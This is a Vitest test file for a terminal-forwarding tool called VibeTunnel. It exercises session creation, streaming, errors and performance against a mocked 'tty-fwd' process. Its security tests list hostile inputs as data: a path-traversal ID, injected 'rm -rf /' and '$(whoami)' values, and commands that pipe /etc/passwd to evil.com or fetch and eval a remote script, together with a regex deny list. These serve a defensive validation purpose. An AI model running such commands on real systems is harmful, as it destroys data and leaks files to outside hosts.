import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { spawn } from 'child_process';
import { EventEmitter } from 'events';

// Mock modules
vi.mock('child_process', () => ({
  spawn: vi.fn(),
}));

vi.mock('fs', () => ({
  default: {
    existsSync: vi.fn(() => true),
    mkdirSync: vi.fn(),
    readFileSync: vi.fn(() => '{"lines": ["test"], "cursor": {"x": 0, "y": 0}}'),
    readdirSync: vi.fn(() => []),
    statSync: vi.fn(() => ({ isDirectory: () => true })),
  },
}));

vi.mock('os', () => ({
  default: {
    homedir: () => '/home/test',
  },
}));

describe('Critical VibeTunnel Functionality', () => {
  let mockSpawn: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();
    mockSpawn = vi.mocked(spawn);

    // Default mock for tty-fwd success
    const mockTtyFwdProcess = {
      stdout: {
        on: vi.fn((event, callback) => {
          if (event === 'data') {
            callback(Buffer.from('{}'));
          }
        }),
      },
      stderr: { on: vi.fn() },
      on: vi.fn((event, callback) => {
        if (event === 'close') callback(0);
      }),
      kill: vi.fn(),
    };

    mockSpawn.mockReturnValue(mockTtyFwdProcess);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Session Management', () => {
    it('should spawn a new terminal session', async () => {
      // Mock successful session creation
      mockSpawn.mockImplementationOnce(() => ({
        stdout: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              callback(Buffer.from('session-123'));
            }
          }),
        },
        stderr: { on: vi.fn() },
        on: vi.fn((event, callback) => {
          if (event === 'close') callback(0);
        }),
        kill: vi.fn(),
      }));

      // Execute spawn command
      const args = ['spawn', '--name', 'Test Session', '--cwd', '/home/test', '--', 'bash'];
      const proc = mockSpawn('tty-fwd', args);

      let sessionId = '';
      proc.stdout.on('data', (data: Buffer) => {
        sessionId = data.toString().trim();
      });

      // Wait for process to complete
      await new Promise((resolve) => {
        proc.on('close', resolve);
      });

      expect(sessionId).toBe('session-123');
      expect(mockSpawn).toHaveBeenCalledWith('tty-fwd', args);
    });

    it('should list active sessions', async () => {
      const mockSessions = {
        'session-1': {
          cmdline: ['bash'],
          cwd: '/home/test',
          exit_code: null,
          name: 'bash',
          pid: 1234,
          started_at: '2024-01-01T00:00:00Z',
          status: 'running',
          stdin: '/tmp/session-1.stdin',
          'stream-out': '/tmp/session-1.out',
          waiting: false,
        },
      };

      mockSpawn.mockImplementationOnce(() => ({
        stdout: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              callback(Buffer.from(JSON.stringify(mockSessions)));
            }
          }),
        },
        stderr: { on: vi.fn() },
        on: vi.fn((event, callback) => {
          if (event === 'close') callback(0);
        }),
        kill: vi.fn(),
      }));

      const proc = mockSpawn('tty-fwd', ['list']);
      let sessions = {};

      proc.stdout.on('data', (data: Buffer) => {
        sessions = JSON.parse(data.toString());
      });

      await new Promise((resolve) => {
        proc.on('close', resolve);
      });

      expect(sessions).toEqual(mockSessions);
      expect(Object.keys(sessions)).toHaveLength(1);
    });

    it('should handle terminal input/output', async () => {
      const mockStreamProcess = new EventEmitter() as EventEmitter & {
        stdout: EventEmitter;
        stderr: EventEmitter;
        kill: ReturnType<typeof vi.fn>;
      };
      mockStreamProcess.stdout = new EventEmitter();
      mockStreamProcess.stderr = new EventEmitter();
      mockStreamProcess.kill = vi.fn();

      mockSpawn.mockImplementationOnce(() => mockStreamProcess);

      // Start streaming
      const streamData: string[] = [];
      const proc = mockSpawn('tty-fwd', ['stream', 'session-123']);

      proc.stdout.on('data', (data: Buffer) => {
        streamData.push(data.toString());
      });

      // Simulate terminal output
      mockStreamProcess.stdout.emit('data', Buffer.from('$ echo "Hello World"\n'));
      mockStreamProcess.stdout.emit('data', Buffer.from('Hello World\n'));
      mockStreamProcess.stdout.emit('data', Buffer.from('$ '));

      expect(streamData).toEqual(['$ echo "Hello World"\n', 'Hello World\n', '$ ']);
    });

    it('should terminate sessions cleanly', async () => {
      mockSpawn.mockImplementationOnce(() => ({
        stdout: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              callback(Buffer.from('Session terminated'));
            }
          }),
        },
        stderr: { on: vi.fn() },
        on: vi.fn((event, callback) => {
          if (event === 'close') callback(0);
        }),
        kill: vi.fn(),
      }));

      const proc = mockSpawn('tty-fwd', ['terminate', 'session-123']);
      let result = '';

      proc.stdout.on('data', (data: Buffer) => {
        result = data.toString();
      });

      await new Promise((resolve) => {
        proc.on('close', resolve);
      });

      expect(result).toBe('Session terminated');
    });
  });

  describe('WebSocket Communication', () => {
    it('should handle terminal resize events', () => {
      const resizeArgs = ['resize', 'session-123', '120', '40'];
      mockSpawn('tty-fwd', resizeArgs);

      expect(mockSpawn).toHaveBeenCalledWith('tty-fwd', resizeArgs);
    });

    it('should handle concurrent sessions', async () => {
      const sessions = ['session-1', 'session-2', 'session-3'];
      const processes = sessions.map((sessionId) => {
        return mockSpawn('tty-fwd', ['stream', sessionId]);
      });

      expect(processes).toHaveLength(3);
      expect(mockSpawn).toHaveBeenCalledTimes(3);
    });
  });

  describe('Error Handling', () => {
    it('should handle command execution failures', async () => {
      mockSpawn.mockImplementationOnce(() => ({
        stdout: { on: vi.fn() },
        stderr: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              callback(Buffer.from('Error: Command not found'));
            }
          }),
        },
        on: vi.fn((event, callback) => {
          if (event === 'close') callback(1);
        }),
        kill: vi.fn(),
      }));

      const proc = mockSpawn('tty-fwd', ['spawn', '--', 'nonexistent-command']);
      let error = '';
      let exitCode = 0;

      proc.stderr.on('data', (data: Buffer) => {
        error = data.toString();
      });

      proc.on('close', (code: number) => {
        exitCode = code;
      });

      await new Promise((resolve) => {
        proc.on('close', resolve);
      });

      expect(exitCode).toBe(1);
      expect(error).toContain('Command not found');
    });

    it('should handle timeout scenarios', () => {
      const mockSlowProcess = {
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        on: vi.fn(),
        kill: vi.fn(),
      };

      mockSpawn.mockImplementationOnce(() => mockSlowProcess);

      const proc = mockSpawn('tty-fwd', ['list']);

      // Simulate timeout
      setTimeout(() => {
        proc.kill('SIGTERM');
      }, 100);

      expect(proc.kill).toBeDefined();
      expect(mockSlowProcess.kill).toBeDefined();
    });
  });

  describe('Security and Validation', () => {
    it('should validate session IDs', () => {
      const validSessionId = 'abc123-def456-789';
      const invalidSessionIds = [
        '../../../etc/passwd',
        'session; rm -rf /',
        '$(whoami)',
        '',
        null,
        undefined,
      ];

      const isValidSessionId = (id: unknown) => {
        return typeof id === 'string' && /^[a-zA-Z0-9-]+$/.test(id);
      };

      expect(isValidSessionId(validSessionId)).toBe(true);
      invalidSessionIds.forEach((id) => {
        expect(isValidSessionId(id)).toBe(false);
      });
    });

    it('should sanitize command arguments', () => {
      const dangerousCommands = [
        ['rm', '-rf', '/'],
        ['eval', '$(curl evil.com/script.sh)'],
        ['bash', '-c', 'cat /etc/passwd | curl evil.com'],
      ];

      const isSafeCommand = (cmd: string[]) => {
        const dangerousPatterns = [/rm\s+-rf/, /eval/, /curl.*evil/, /\$\(/, /`/];

        const cmdString = cmd.join(' ');
        return !dangerousPatterns.some((pattern) => pattern.test(cmdString));
      };

      dangerousCommands.forEach((cmd) => {
        expect(isSafeCommand(cmd)).toBe(false);
      });

      expect(isSafeCommand(['ls', '-la'])).toBe(true);
      expect(isSafeCommand(['echo', 'hello'])).toBe(true);
    });
  });

  describe('Performance', () => {
    it('should handle rapid session creation', async () => {
      const startTime = performance.now();

      // Create 10 sessions rapidly
      const sessionPromises = Array.from({ length: 10 }, (_, i) => {
        return new Promise((resolve) => {
          const proc = mockSpawn('tty-fwd', ['spawn', '--', 'bash']);
          proc.on('close', () => resolve(i));
        });
      });

      await Promise.all(sessionPromises);

      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // Should complete within reasonable time
      expect(totalTime).toBeLessThan(1000); // 1 second for 10 sessions
      expect(mockSpawn).toHaveBeenCalledTimes(10);
    });

    it('should handle large terminal output efficiently', () => {
      const largeOutput = 'X'.repeat(100000); // 100KB of data

      const mockProcess = new EventEmitter() as EventEmitter & {
        stdout: EventEmitter;
        stderr: EventEmitter;
        kill: ReturnType<typeof vi.fn>;
      };
      mockProcess.stdout = new EventEmitter();
      mockProcess.stderr = new EventEmitter();
      mockProcess.kill = vi.fn();

      mockSpawn.mockImplementationOnce(() => mockProcess);

      const proc = mockSpawn('tty-fwd', ['stream', 'session-123']);
      let receivedData = '';

      proc.stdout.on('data', (data: Buffer) => {
        receivedData += data.toString();
      });

      // Emit large output
      const startTime = performance.now();
      mockProcess.stdout.emit('data', Buffer.from(largeOutput));
      const endTime = performance.now();

      expect(receivedData).toBe(largeOutput);
      expect(endTime - startTime).toBeLessThan(100); // Should process quickly
    });
  });
});
